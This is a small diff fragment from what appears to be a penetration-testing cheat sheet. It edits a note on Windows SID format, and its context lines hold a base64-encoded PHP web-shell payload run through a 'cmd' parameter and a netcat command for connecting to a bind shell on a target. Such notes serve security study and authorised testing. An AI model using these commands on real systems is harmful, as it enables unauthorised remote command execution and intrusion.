@@ -806,9 +806,6 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - Bind shell to target , port xxx
   `nc 192.168.124.220 4444` (Trial & Error port: 80,445,443,4444,8888,8080,9999)  
   `C:\Users\<user>>powershell`  
-- SID User
-  - S-<Revision>-<IdentifierAuthority>-<SubAuthority1>-<SubAuthority2>-...-<RID>
-  - S-1-5-21-2309961351-4093026482-2223492918-1002
 - Enumerating windows
   ```
   #User
